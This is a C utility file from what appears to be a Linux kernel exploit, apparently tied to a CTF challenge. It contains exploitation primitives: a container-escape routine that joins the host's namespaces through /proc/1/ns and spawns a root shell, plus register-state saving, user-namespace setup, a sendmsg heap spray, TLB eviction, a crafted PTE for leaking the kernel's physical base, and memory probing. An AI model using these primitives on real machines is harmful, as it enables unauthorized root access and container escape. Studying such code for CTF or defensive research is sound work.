#define _GNU_SOURCE
#include "util.h"
#include <fcntl.h>
#include <pthread.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <unistd.h>

bool is_kernel_ptr(uint64_t val) {
    return (val & KERNEL_MASK) == KERNEL_MASK && val != 0xffffffffffffffff;
}

bool is_heap_ptr(uint64_t val) {
    return (val & HEAP_MASK) == HEAP_MASK &&
           (val & KERNEL_MASK) != KERNEL_MASK && val != 0xffffffffffffffff;
}

void info(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[+] ");
    vprintf(format, args);

    va_end(args);
}

void error(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[x] ");
    vprintf(format, args);

    va_end(args);
}

void hexdump(void *buf, size_t len) {
    uint64_t *tmp = (uint64_t *)buf;

    for (size_t i = 0; i < (len / 8); i++) {
        printf("%lu: %p ", i, (void *)tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

void get_shell_docker(void) {
    puts("Got r00t :)");
    // spin the parent
    // if(fork()){ for(;;); }
    // move to safe cpu
    // to prevent access to corrupted freelist
    assign_to_core(1);
    sleep(1);

    // escape pid/mount/network namespace
    setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
    setns(open("/proc/1/ns/net", O_RDONLY), 0);

    // drop root shell
    execlp("/bin/bash", "/bin/bash", NULL);
    exit(0);
}

static void get_shell(void) {
    if (!getuid()) {
        puts("Got r00t :)");
        execlp("/bin/bash", "/bin/bash", NULL);
    }
    exit(0);
}

uint64_t user_cs, user_ss, user_sp, user_rflags;
void save_state(void) {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
}

void assign_thread_to_core(int core_id) {
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0) {
        errExit("[X] assign_thread_to_core_range()");
    }
}

void assign_to_core(int core_id) {
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0) {
        errExit("[X] sched_setaffinity()");
    }
}

int ulimit_fd(void) {
    struct rlimit rlim;

    // Get the current resource limits
    if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
        perror("getrlimit");
        return 1;
    }

    // printf("Current maximum file descriptors limit: %ld\n", rlim.rlim_cur);

    // Increase the maximum file descriptors limit
    rlim.rlim_cur = rlim.rlim_max;
    if (setrlimit(RLIMIT_NOFILE, &rlim) == -1) {
        perror("setrlimit");
        return 1;
    }

    // Get the updated resource limits
    if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
        perror("getrlimit");
        return 1;
    }

    info("New maximum file descriptors limit: %ld\n", rlim.rlim_cur);

    return 0;
}

void unshare_setup(uid_t uid, gid_t gid) {
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    return;
}

void print_regs(pt_regs_t *regs) {
    printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14,
           regs->r13, regs->r12);
    printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11,
           regs->r10);
    printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax,
           regs->cx);
    printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di,
           regs->ip);
    printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags,
           regs->sp, regs->ss);
}

// https://u1f383.github.io/android/2025/09/08/corCTF-2025-corphone.html
// PTE entry, which when read leaks the physical address from the __brk_base
// symbol in kernel data segment. => Can then be used to calculate the physical
// base address of the kernel
uint64_t stext_phys_leak_pte() { return 0x9c000 | 0x8000000000000067; }

// Spray based on sock_kmalloc:
//
// Triggers at most one temporary sock_kmalloc() for msg_control in
// ____sys_sendmsg() when msg_controllen exceeds the small on-stack buffer (36
// bytes).
//
// The buffer is always freed before the syscall returns, so this is not
// a persistent spray.
//
// allocation happens here:
// https://github.com/torvalds/linux/blob/80234b5ab240f52fa45d201e899e207b9265ef91/net/socket.c#L2564
static int g_sockfd[2] = {-1, -1};
void spray_unix_control(void *data, size_t len) {
    if (g_sockfd[0] == -1 || g_sockfd[1] == -1) {
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, g_sockfd) < 0) {
            errExit("socketpair");
        }
    }
    char payload = 'A';
    struct iovec iov = {.iov_base = &payload, .iov_len = sizeof(payload)};
    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = data,
        .msg_controllen = len,
    };

    if (sendmsg(g_sockfd[1], &msg, 0) < 0) {
        // perror("sendmsg");
    }
}

// Evict TLB entries by creating and touching many temporary mappings.
// Touching each page forces a page-table walk and fills the TLB with new
// translations, pushing out older entries by capacity pressure.
void evict_tlb() {
    for (unsigned i = 0; i < 0x100; ++i) {
        char *m = (char *)mmap(PTI_TO_VIRT(2, 0, i, 0), PAGE_SIZE,
                               PROT_READ | PROT_WRITE,
                               MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

        if (m == MAP_FAILED) {
            errExit("evict mmap failed \n");
        }

        *m = 'A';
    }
    for (unsigned i = 0; i < 0x100; ++i) {
        int ret = munmap(PTI_TO_VIRT(2, 0, i, 0), PAGE_SIZE);
        if (ret < 0) {
            errExit("munmap failed\n");
        }
    }
}

#define TLB_EVICT2_PAGES 0x4000

void evict_tlb2(void) {
    const size_t len = TLB_EVICT2_PAGES * PAGE_SIZE;
    volatile unsigned char *base =
        mmap(PTI_TO_VIRT(4, 0, 0, 0), len, PROT_READ,
             MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED | MAP_NORESERVE, -1, 0);
    volatile unsigned char sink = 0;

    if (base == MAP_FAILED) {
        errExit("evict_tlb2 mmap failed");
    }

    /*
     * The odd multiplier permutes every page in this power-of-two-sized
     * region. This varies both PTE and PMD index bits while avoiding a
     * simple sequential replacement pattern.
     */
    for (unsigned pass = 0; pass < 2; ++pass) {
        for (size_t i = 0; i < TLB_EVICT2_PAGES; ++i) {
            size_t page = (i * 8191 + pass * 4099) & (TLB_EVICT2_PAGES - 1);
            /*
             * Read faults use the shared zero page. Writing here would
             * allocate one private physical page per TLB entry.
             */
            sink ^= base[page * PAGE_SIZE];
        }
    }

    if (munmap((void *)base, len) < 0) {
        errExit("evict_tlb2 munmap failed");
    }

    (void)sink;
}

static sigjmp_buf g_fault_jmp;
static volatile sig_atomic_t g_probing = 0;
static volatile sig_atomic_t g_writable_probe_active = 0;
static volatile sig_atomic_t g_writable_probe_faulted = 0;
static volatile uintptr_t g_writable_probe_addr = 0;
static volatile uintptr_t g_writable_probe_resume = 0;

static void fault_handler(int sig, siginfo_t *si, void *ctx) {
    if (g_writable_probe_active &&
        (uintptr_t)si->si_addr == g_writable_probe_addr) {
        ucontext_t *uc = ctx;

        g_writable_probe_faulted = 1;
        g_writable_probe_active = 0;
        uc->uc_mcontext.gregs[REG_RIP] = g_writable_probe_resume;
        return;
    }

    if (g_probing) {
        g_probing = 0;
        siglongjmp(g_fault_jmp, sig);
    }

    exit(128 + sig);
}

static bool g_fault_handler_installed = false;
void install_fault_handler(void) {
    struct sigaction sa = {0};

    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
    sa.sa_sigaction = fault_handler;
    sigemptyset(&sa.sa_mask);

    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGILL, &sa, NULL);

    g_fault_handler_installed = true;
}

// check if an address is writable, surviving a segfault
bool is_writable(void *addr) {
    if (!g_fault_handler_installed) {
        errExit("fault handler was not installed, call install_fault_handler() "
                "before using this func \n");
    }
    unsigned char value = *(volatile unsigned char *)addr;

    g_writable_probe_faulted = 0;
    g_writable_probe_addr = (uintptr_t)addr;
    g_writable_probe_resume = (uintptr_t)&&probe_resume;
    g_writable_probe_active = 1;

    __asm__ volatile("mov byte ptr [%1], %b0\n\t"
                     :
                     : "q"(value), "r"(addr)
                     : "memory");

probe_resume:
    g_writable_probe_active = 0;
    g_writable_probe_addr = 0;
    g_writable_probe_resume = 0;
    return !g_writable_probe_faulted;
}
